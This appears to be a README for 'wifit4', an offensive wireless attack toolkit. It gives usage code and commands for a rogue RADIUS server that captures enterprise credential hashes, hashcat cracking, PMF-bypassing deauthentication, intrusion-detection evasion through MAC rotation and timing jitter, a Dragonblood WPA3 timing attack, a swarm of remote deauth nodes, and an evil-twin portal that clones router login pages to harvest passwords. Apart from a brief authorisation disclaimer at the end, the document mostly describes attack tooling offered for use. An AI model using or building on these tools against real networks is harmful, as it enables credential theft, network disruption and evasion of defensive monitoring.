# wifit4 — Next-Generation Upgrade Guide

wifit4 is a full rebrand and deep upgrade of the original [wifit3](https://github.com/derv82/wifit3)
USB wireless auditor.  The core USB/driver/TUI architecture is preserved unchanged; six new
attack and performance subsystems are layered on top.

---

## What's New at a Glance

```
┌──────────────────────────────────────────────────────────────┐
│            wifit4 Next-Gen Architecture                       │
├──────────────┬──────────────────────┬────────────────────────┤
│ Performance  │ Protocol Upgrades    │ Enterprise & AI         │
├──────────────┼──────────────────────┼────────────────────────┤
│ RingBuffer   │ WPA3-SAE Dragonblood │ Rogue RADIUS (802.1X)  │
│ RxPipeline   │ PMF/802.11w Bypass   │ Smart AI Deauth        │
│ Async stages │ BTM/CSA/OCN inject   │ Distributed Mesh Nodes │
└──────────────┴──────────────────────┴────────────────────────┘
```

---

## Phase 1 — Speed Core  `src/wifit4/core/`

**Problem:** Python's per-frame object allocation drops packets at >500 pps
(crowded environments, 50+ APs).

**Solution:**
- `RingBuffer` — single pre-allocated `bytearray` arena (512 × 2048 byte slots).
  The USB I/O thread writes raw bytes into the next slot without creating any
  Python objects.  A `(slot_id, length)` tuple is pushed to an `asyncio.Queue`.
- `RxPipeline` — three-stage async pipeline:
  ```
  USB thread  →  RingBuffer  →  FrameParser (run_in_executor)  →  Sink callbacks
  ```
  Parsing runs in a thread pool so heavy beacon frames never block the event loop.
  `PipelineStats` tracks rx/parsed/error counts and average parse latency.

**Integration:** Drop-in replacement for the existing `rx_reader` + `sink` loop:
```python
from wifit4.core import RxPipeline, RingBuffer

ring = RingBuffer(slot_count=512)
pipeline = RxPipeline(ring, frame_parser=dot11_parser.parse)
pipeline.add_sink(wlan_interface.on_frame)
asyncio.create_task(pipeline.run())

# In USB thread:
pipeline.ingest_raw(usb_bulk_data)
```

---

## Phase 2 — 802.1X Enterprise Suite  `src/wifit4/attacks/enterprise/`

**Target:** Corporate WPA-Enterprise (802.1X) networks — unsupported by wifit3.

**Three modules:**

| Module | Role |
|--------|------|
| `eap_capture.py` | EAP state machine; parses EAP-PEAP/TTLS tunnels; extracts MSCHAPv2 challenge+response pairs |
| `mschapv2.py` | RFC 2759 NT hash, `challenge_hash`, `nt_response`, `verify_response` |
| `rogue_radius.py` | Async UDP RADIUS server; sends Access-Challenge to sustain EAP exchange; generates hostapd config |

**`MSCHAPv2Crackable`** exports to:
- `to_netntlmv2()` — Responder-compatible log format
- `to_hashcat_5500()` — direct hashcat `-m 5500` input

**Quick start:**
```bash
# 1. Start the rogue RADIUS + TUI
uv run wifit4 enterprise --ssid "Corp-WiFi" --iface wlan1 --channel 6

# 2. Start hostapd pointing at the local RADIUS
sudo hostapd /tmp/wifit4_hostapd.conf

# 3. Captured hashes appear in enterprise_captures.txt
hashcat -m 5500 enterprise_captures.txt rockyou.txt
```

**Install extras:** `pip install "wifit4[enterprise]"`

---

## Phase 3 — Crack Integration  `src/wifit4/crack/`

**Problem:** wifit3 only saves `.hc22000`; user must run hashcat manually.

**Two subsystems:**

**`CloudCrackUploader`** — fires async `httpx` POST to your private GPU webhook
the moment a capture is validated:
```python
uploader = CloudCrackUploader(
    webhook_url="https://my-gpu-server/",
    on_result=lambda r: notify(f"Cracked: {r.psk}"),
)
await uploader.submit(CrackJob(ssid="Home", bssid="aa:bb:...", hc22000_path=path))
```
Polls for result every 15 s; fires `on_result` with the PSK.

**`InAppCracker`** — runs local `hashcat` as an async subprocess, streams stdout,
fires `on_result` on first crack line — no waiting for process exit:
```python
cracker = InAppCracker(on_result=lambda r: print(r.psk))
await cracker.crack(job, wordlist=Path("rockyou.txt"), mode="wpa2")
```

**CLI:**
```bash
uv run wifit4 crack --file capture.hc22000 --webhook https://gpu.example.com \
    --ssid "Home" --bssid "aa:bb:cc:dd:ee:ff"
```

**Install extras:** `pip install "wifit4[crack]"`

---

## Phase 4 — Adaptive Stealth Deauth  `src/wifit4/attacks/deauth/`

**Problem:** Modern enterprise APs (Meraki, Aruba, Fortinet) detect and block
standard deauth floods in <2 s.  802.11w PMF encrypts management frames.

**`PmfBypassDeauth`** — four bypass strategies:

| Strategy | Mechanism | PMF-proof? |
|----------|-----------|-----------|
| `CLASSIC_DEAUTH` | Reason-code flood | ✗ blocked by PMF |
| `CSA_INJECTION` | Beacon with Channel Switch Announcement to ch14 | ✓ |
| `BTM_REQUEST` | 802.11v BSS Transition Management Request action frame | ✓ |
| `OCN_FLOOD` | Operating Channel Notification destabilises STA state | ✓ |
| `ADAPTIVE` | Auto-selects best strategy per client from success history | ✓ |

```python
deauth = PmfBypassDeauth(
    ap_bssid="aa:bb:cc:dd:ee:ff",
    ap_channel=6,
    inject_fn=driver.inject_frame,
    strategy=DeauthStrategy.ADAPTIVE,
    stealth=True,           # ±40% timing jitter
)
deauth.add_client("11:22:33:44:55:66")
asyncio.create_task(deauth.run_continuous())
```

---

## Phase 5 — AI Channel Hopper + WIDS Evasion  `src/wifit4/ai/`

**`AdaptiveChannelHopper`** — UCB1 multi-armed bandit.  Learns which channels
carry the most relevant traffic (handshakes, PMKIDs) and biases dwell time
toward high-value channels.  No external ML dependencies.

```python
hopper = AdaptiveChannelHopper(channels=SUPPORTED_CHANNELS)
next_ch = hopper.next_channel()          # UCB1 selection
hopper.reward(channel=6, value=3.0)      # handshake captured = +3
hopper.penalise(channel=11, amount=0.5)  # AP gone, reduce weight
```

**`WidsEvader`** — transparent inject wrapper with:
- **Poisson-distributed inter-frame delays** (vs fixed intervals)
- **TX-power jitter** via `set_txpower_fn` hook
- **MAC rotation** — cycles locally-administered source MACs every N frames
- **Benign probe-response interleaving** — dilutes attack:benign ratio

```python
evader = WidsEvader(
    inject_fn=driver.inject_frame,
    base_delay_ms=100,
    mac_pool=["de:ad:be:ef:00:01", "de:ad:be:ef:00:02"],
    interleave_benign=True,
)
evader.inject(deauth_frame)   # queued; async dispatch handles timing
asyncio.create_task(evader.run())
```

---

## Phase 6 — Distributed Mesh Daemon  `src/wifit4/mesh/`

**Problem:** wifit3 requires physical presence at the screen.

**`MeshDaemon`** — headless FastAPI REST node.  Deploy on Raspberry Pi Zero 2 W:
```bash
# On each Pi node
uv run wifit4 daemon --host 0.0.0.0 --port 8765
```

REST API:
```
GET  /status              node health
GET  /scan                current AP table (JSON)
POST /scan/start          begin adaptive channel hopping
POST /attack/deauth       {"bssid":"...", "client":"...", "strategy":"ADAPTIVE"}
GET  /captures            list .hc22000 / .pcap files
GET  /captures/{name}     download capture file
POST /crack/submit        {"file":"x.hc22000", "webhook_url":"..."}
WS   /events              SSE stream of capture/crack events
```

**`SwarmCoordinator`** — central laptop controller for N nodes:
```python
swarm = SwarmCoordinator(["http://pi1.local:8765", "http://pi2.local:8765"])
await swarm.connect()
await swarm.assign_channels()          # no-overlap band split
aps = await swarm.merged_ap_table()    # deduplicated by best RSSI
await swarm.broadcast_deauth("aa:bb:cc:dd:ee:ff")
files = await swarm.pull_captures(Path("./captures"))
```

**Install extras:** `pip install "wifit4[mesh]"`

---

## Phase 7 — WPA3-SAE Dragonblood  `src/wifit4/attacks/wpa3/`

Implements the Hunting-and-Pecking timing side-channel from CVE-2019-9494
(Vanhoef & Ronen, IEEE S&P 2020).

**`DragonbloodProbe`** measures the RTT of SAE Commit responses for each
password candidate.  Fewer H&P loop iterations → faster response → candidate
is more likely correct.

```python
probe = DragonbloodProbe(
    ap_bssid="aa:bb:cc:dd:ee:ff",
    ap_channel=6,
    our_mac="de:ad:be:ef:00:01",
    inject_fn=driver.inject_frame,
    register_rx=interface.register_rx_callback,
)
results = await probe.probe_candidates(["password1", "letmein", "admin123"])
# results[0] is the most likely candidate (lowest mean RTT)
```

> **Note:** Patched AP firmware (post-2019) applies constant-time blinding.
> This attack targets unpatched WPA3-SAE implementations.

---

## Phase 8 — Smart EvilTwin Portal  `src/wifit4/attacks/eviltwin/`

**`SmartPortal`** detects the target router brand via OUI lookup and WPS model
string, then serves a pixel-perfect clone of that vendor's admin login page.

Built-in templates: TP-Link, NETGEAR, ASUS, D-Link, Linksys, Cisco/Meraki, Generic.

Optional LLM generation: set `WIFIT4_LLM_API_KEY` for GPT-4o-mini custom pages.

```python
portal = SmartPortal(
    ap_bssid="d8:0d:17:aa:bb:cc",     # → auto-detected as TP-Link Archer
    on_credential=lambda u, p: save(u, p),
    use_llm=False,
)
await portal.start()     # serves on :80
```

---

## Installation

```bash
# Core only (TUI + all original wifit3 features)
uv sync

# All next-gen features
pip install "wifit4[full]"

# Individual extras
pip install "wifit4[enterprise]"   # 802.1X
pip install "wifit4[crack]"        # cloud webhook
pip install "wifit4[mesh]"         # daemon + swarm
```

## Running

```bash
uv run wifit4                              # TUI (same as wifit3)
uv run wifit4 daemon --port 8765           # headless mesh node
uv run wifit4 enterprise --ssid Corp ...   # 802.1X capture
uv run wifit4 crack --file x.hc22000 ...  # cloud crack submit
```

## Architecture Map

```
src/wifit4/
├── core/
│   ├── ring_buffer.py      # zero-copy USB RX arena
│   └── pipeline.py         # 3-stage async packet pipeline
├── attacks/
│   ├── enterprise/
│   │   ├── eap_capture.py  # EAP-PEAP/TTLS MSCHAPv2 extractor
│   │   ├── mschapv2.py     # RFC 2759 NT hash implementation
│   │   └── rogue_radius.py # async UDP RADIUS server
│   ├── deauth/
│   │   └── pmf_bypass.py   # BTM/CSA/OCN/classic deauth strategies
│   ├── wpa3/
│   │   └── dragonblood.py  # SAE timing side-channel probe
│   └── eviltwin/
│       └── smart_portal.py # vendor-cloning captive portal
├── ai/
│   ├── channel_hopper.py   # UCB1 bandit adaptive channel selection
│   └── wids_evader.py      # Poisson timing + MAC rotation evasion
├── crack/
│   └── cloud_crack.py      # cloud webhook + local hashcat runner
└── mesh/
    ├── daemon.py            # FastAPI REST headless node
    └── swarm.py             # multi-node swarm coordinator
```

---

## Legal Notice

For use only on networks and devices you own or are explicitly authorised to
audit.  wifit4 operates at the USB register level without kernel guardrails.
All attack modules (deauth, enterprise capture, Dragonblood, EvilTwin) target
auditing scenarios only.  Use responsibly.
